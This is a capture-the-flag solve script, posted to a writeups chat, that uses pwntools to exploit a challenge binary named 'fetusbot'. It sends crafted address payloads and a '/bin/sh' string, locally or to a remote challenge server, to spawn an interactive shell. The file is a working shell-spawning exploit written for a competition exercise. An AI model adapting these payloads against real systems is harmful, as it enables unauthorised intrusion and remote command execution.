# Solve by yqroo - posted in writeups chat
#  


#!/usr/bin/env python3
from pwn import *

# elf = context.binary = ELF('./fetusbot')
# libc = elf.libc
context.update(
    log_level='debug'
)

sla = lambda x, y: p.sendlineafter(x, y)
sa = lambda x, y: p.sendafter(x, y)
sl = lambda x: p.sendline(x)
s = lambda x: p.send(x)
rcall = lambda x: p.recvall(x)
rcud = lambda x: p.recvuntil(x, drop=True)
rcu = lambda x: p.recvuntil(x)
rcl = lambda: p.recvline(0)
rcn = lambda x: p.recv(x)

def start():
    global libc
    if args.REMOTE:
        return remote(HOST, PORT)
    elif args.GDB:
        return gdb.debug("./fetusbot", c)
    else:
        # return elf.process()
        return process("./fetusbot")

c = '''
b* main
c
'''

REMOTE = 'nc 0.cloud.chals.io 26925'.replace('nc ', '').split(' ')
HOST = REMOTE[0] if REMOTE else ''
PORT = int(REMOTE[1]) if len(REMOTE) > 1 else 0

p = start()
payload = p64(0x133700a) + p64(0x13370c3) + p64(0x13370b8) + p64(0x133705a) + p64(0x133705a) +  p64(0x133700a) + p64(0x13370c3) + b"/bin/sh\x00" 
s(payload)
sleep(1)
s(b"\x00"*16+ p64(0x13370b8) + p64(0x133705a) + p64(0x133700d) + b"/bin/sh\x00" + b'a'*0xb)

p.interactive()